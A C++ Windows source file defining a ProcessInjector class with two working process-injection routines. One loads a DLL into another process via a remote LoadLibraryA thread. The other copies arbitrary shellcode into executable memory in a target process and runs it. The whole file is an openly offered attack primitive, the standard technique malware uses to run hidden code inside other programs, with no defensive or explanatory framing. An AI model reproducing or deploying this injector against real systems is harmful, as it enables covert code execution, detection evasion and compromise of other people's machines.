#ifdef _WIN32
#include <windows.h>
#include <tlhelp32.h>
#include <string>
#include <vector>
#include <cstdint>

class ProcessInjector
{
public:
    static bool inject_dll(DWORD target_pid, const std::string &dll_path)
    {
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
        if (!hProcess)
            return false;

        // Allocate memory in target process
        void *remote_memory = VirtualAllocEx(hProcess, nullptr, dll_path.size() + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!remote_memory){
            CloseHandle(hProcess);
            return false;
        }

        // Write DLL path to target process
        if (!WriteProcessMemory(hProcess, remote_memory, dll_path.c_str(),
                                dll_path.size() + 1, nullptr)){
            VirtualFreeEx(hProcess, remote_memory, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }

        // Get LoadLibraryA address
        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
        FARPROC pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA");

        // Create remote thread
        HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0,
                                            (LPTHREAD_START_ROUTINE)pLoadLibrary,
                                            remote_memory, 0, nullptr);

        if (hThread){
            WaitForSingleObject(hThread, INFINITE);
            CloseHandle(hThread);
        }

        VirtualFreeEx(hProcess, remote_memory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return hThread != nullptr;
    }

    static bool inject_shellcode(DWORD target_pid, const std::vector<uint8_t> &shellcode)
    {
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
        if (!hProcess)
            return false;

        // Allocate executable memory
        void *remote_memory = VirtualAllocEx(hProcess, nullptr, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!remote_memory){
            CloseHandle(hProcess);
            return false;
        }

        // Write shellcode
        if (!WriteProcessMemory(hProcess, remote_memory, shellcode.data(), shellcode.size(), nullptr)){
            VirtualFreeEx(hProcess, remote_memory, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            return false;
        }

        // Execute shellcode
        HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)remote_memory, nullptr, 0, nullptr);

        if (hThread){
            CloseHandle(hThread);
        }

        CloseHandle(hProcess);
        return hThread != nullptr;
    }
};
#endif